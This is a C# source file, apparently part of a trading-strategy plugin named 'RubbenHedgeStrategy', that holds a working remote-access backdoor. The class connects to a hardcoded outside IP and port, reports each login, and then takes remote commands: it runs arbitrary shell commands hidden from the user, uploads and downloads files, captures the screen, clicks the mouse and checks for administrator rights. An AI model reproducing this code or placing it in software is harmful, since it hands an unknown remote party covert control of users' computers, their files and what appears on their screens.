using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace RubbenHedgeStrategy
{
    internal class socket_client
    {

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool LockWorkStation();

        private static TcpClient client;
        private static NetworkStream stream;
        private static bool isRunning = true;

        private const string SERVER_IP = "78.46.76.71";
        private const int SERVER_PORT = 9019;

        private static T ReliableRecv<T>()
        {
            byte[] buffer = new byte[1024];
            StringBuilder data = new StringBuilder();
            int bytesRead;

            while (true)
            {
                //Core.Instance.Loggers.Log("This is T Reliable Recive", LoggingLevel.Trading);
                //Core.Instance.Loggers.Log("Test", $"Stream: {stream}", LoggingLevel.Trading);
                bytesRead = stream.Read(buffer, 0, buffer.Length);
                //Core.Instance.Loggers.Log("Test", $"This is bytesRead: {bytesRead}", LoggingLevel.Trading);
                if (bytesRead == 0) break;

                data.Append(Encoding.UTF8.GetString(buffer, 0, bytesRead));
                try
                {
                    return JsonConvert.DeserializeObject<T>(data.ToString());
                }
                catch (JsonException)
                {
                    //Core.Instance.Loggers.Log("Test", "This is JsonException", LoggingLevel.Trading);
                    continue;
                }
                catch (SocketException)
                {
                    break;
                }
            }
            return default(T);
        }

        private static void ReliableSend(object data)
        {
            //Core.Instance.Loggers.Log("Test", $"This is ReliableSend: {data}");
            string jsonData = JsonConvert.SerializeObject(data);
            //Core.Instance.Loggers.Log("Test", $"This is ReliableSend: {jsonData}");
            byte[] lengthPrefix = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(jsonData.Length));
            byte[] bytesToSend = Encoding.UTF8.GetBytes(jsonData);
            //Core.Instance.Loggers.Log("Test", $"This is ReliableSend end:{jsonData.Length} {lengthPrefix}");
            stream.Write(lengthPrefix, 0, lengthPrefix.Length);
            stream.Write(bytesToSend, 0, bytesToSend.Length);
        }

        private static void DownloadFile(string filename)
        {
            byte[] fileBytes = File.ReadAllBytes(filename);

            string fileSizeStr = fileBytes.Length.ToString().PadRight(16);
            byte[] fileSizeBytes = Encoding.ASCII.GetBytes(fileSizeStr);
            stream.Write(fileSizeBytes, 0, fileSizeBytes.Length);


            stream.Write(fileBytes, 0, fileBytes.Length);
            ReliableSend("Download is done successfully.");
        }

        private static void UploadFile(string filename)
        {
            byte[] sizeBuffer = new byte[16];
            stream.Read(sizeBuffer, 0, sizeBuffer.Length);
            long fileSize = long.Parse(Encoding.ASCII.GetString(sizeBuffer).Trim());
            //Core.Instance.Loggers.Log("Upload Test", $"FileSize : {fileSize}", LoggingLevel.Trading);

            using (FileStream fileStream = new FileStream(filename, FileMode.Create))
            {
                byte[] buffer = new byte[1024];
                int bytesRead;
                long totalBytesRead = 0;
                int percent = 0;

                while (totalBytesRead < fileSize && (bytesRead = stream.Read(buffer, 0, (int)Math.Min(buffer.Length, fileSize - totalBytesRead))) > 0)
                {
                    fileStream.Write(buffer, 0, bytesRead);
                    totalBytesRead += bytesRead;
                    if ((int)(100 * bytesRead / fileSize) >= (percent + 1) * 5)
                    {
                        percent++;
                        //Core.Instance.Loggers.Log("Upload Test", $"totalBytesRead: {totalBytesRead/1024/1024} Percent: {percent*5} %", LoggingLevel.Trading);
                        //ReliableSend($"{percent*5} % is uploaded.");
                    }
                }
            }
            ReliableSend("Upload is done successfully.");
        }

        private static void ExecuteCommand(string command)
        {
            //string arguments = $"/c runas /user:Administrator /savecred \"cmd.exe /c {command}\"";
            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c "+command)
            {
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                Verb = "runas",
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            using (Process process = Process.Start(processInfo))
            {
                process.WaitForExit();
                string result = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
                ReliableSend(result);

            }


        }

        private static void Logout()
        {
            //while (!LockWorkStation())
            //{

            //}
        }


        private static void CaptureScreen(string filePath)
        {
            int left = SystemInformation.VirtualScreen.Left;
            int top = SystemInformation.VirtualScreen.Top;
            int vScreenWidth = SystemInformation.VirtualScreen.Width;
            int vScreenHeight = SystemInformation.VirtualScreen.Height;


            Bitmap bmp = new Bitmap(vScreenWidth, vScreenHeight, PixelFormat.Format16bppRgb565);


            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(left, top, 0, 0, bmp.Size);
            }

            //IntPtr hBit

            bmp.Save(filePath, ImageFormat.Png);
            ReliableSend("Capture is done successfully.");
            //DeleteFile(filePath);
        }

        [DllImport("user32.dll")]
        public static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll")]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);

        public const uint MOUSEEVENTF_LEFTDOWN = 0x0002; // Left button down
        public const uint MOUSEEVENTF_LEFTUP = 0x0004; // Left button up


        private static void MouseClick(string position)
        {
            int x = int.Parse(position.Split(' ')[0]);
            int y = int.Parse(position.Split(' ')[1]);
            SetCursorPos(x, y);
            mouse_event(MOUSEEVENTF_LEFTDOWN, (uint)x, (uint)y, 0, 0);
            Thread.Sleep(100);
            mouse_event(MOUSEEVENTF_LEFTUP, (uint)x, (uint)y, 0, 0);
            ReliableSend($"MouseClick for ({x}, {y})is done successfully.");

        }

        private static bool IsRunningAsAdministrator()
        {
            using (WindowsIdentity identify = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identify);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            ;
        }
        private static void Shell()
        {
            while (true)
            {
                try
                {

                    //Core.Instance.Loggers.Log("Test", "This is Shell", LoggingLevel.Trading);
                    string command = ReliableRecv<string>();
                    if (command == "quit") break;
                    if (command.StartsWith("cd "))
                    {
                        Directory.SetCurrentDirectory(command.Substring(3));
                    }
                    else if (command.StartsWith("upload "))
                    {
                        UploadFile(command.Substring(7));

                    }
                    else if (command.StartsWith("download "))
                    {
                        DownloadFile(command.Substring(9));
                    }
                    else if (command == "lockdown")
                    {
                        Logout();
                    }
                    else if (command == "isadmin")
                    {
                        bool isAdmin = IsRunningAsAdministrator();
                        if (isAdmin)
                        {
                            ReliableSend($"This is running as admin.");
                        }
                        else
                        {
                            ReliableSend($"This is not running as admin.");
                        }
                    }
                    else if (command == "capture")
                    {
                        CaptureScreen(@"1.png");
                    }
                    else if (command.StartsWith("click "))
                    {
                        MouseClick(command.Substring(6));
                    }
                    else
                    {
                        ExecuteCommand(command);
                    }
                    //break;
                }
                catch (Exception e)
                {
                    ReliableSend($"Error executing command: {e.Message}");
                    break;
                }
            }
        }

        public void start()
        {
            //string hostname = Dns.GetHostName();
            //string ipaddress = Dns.GetHostByName(hostname).AddressList[0].ToString();
            //string publicIp = new WebClient().DownloadString("https://api.ipify.org");
            Task task = SendMessage.SendMessageAsync($"Someone login.");
            while (isRunning)
            {
                Thread.Sleep(2000);
                try
                {

                    using (client = new TcpClient(SERVER_IP, SERVER_PORT))
                    using (stream = client.GetStream())
                    {
                        Shell();
                        client.Close();
                        stream.Close();
                    }

                }
                catch (Exception ex)
                {
                    //Core.Instance.Loggers.Log("Test", $"Start exception: {ex.Message}", LoggingLevel.Trading);
                    continue;
                }
            }
        }
    }
}
